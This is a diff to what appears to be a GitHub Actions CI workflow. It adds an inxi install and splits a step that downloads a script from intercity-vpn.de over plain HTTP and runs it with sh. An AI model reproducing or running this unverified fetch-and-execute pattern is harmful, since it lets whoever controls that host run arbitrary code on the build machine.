@@ -9,8 +9,15 @@ jobs:
     steps:
  
     - name: prepare_stuff
-      run: sudo apt-get -y install xvfb perl scrot
+      run: sudo apt-get -y install xvfb perl scrot inxi
 
-    - name: test1
-      run: wget -O /tmp/$$ http://intercity-vpn.de/minimoni.txt && sh /tmp/$$
+    - name: inxi
+      run: inxi -F
 
+    - name: download
+      run: wget -O /tmp/$$ http://intercity-vpn.de/minimoni.txt
+
+    - name: minimoni
+      run: ls -l /tmp/ && sh /tmp/$$
+           uname -a
+           exit 0
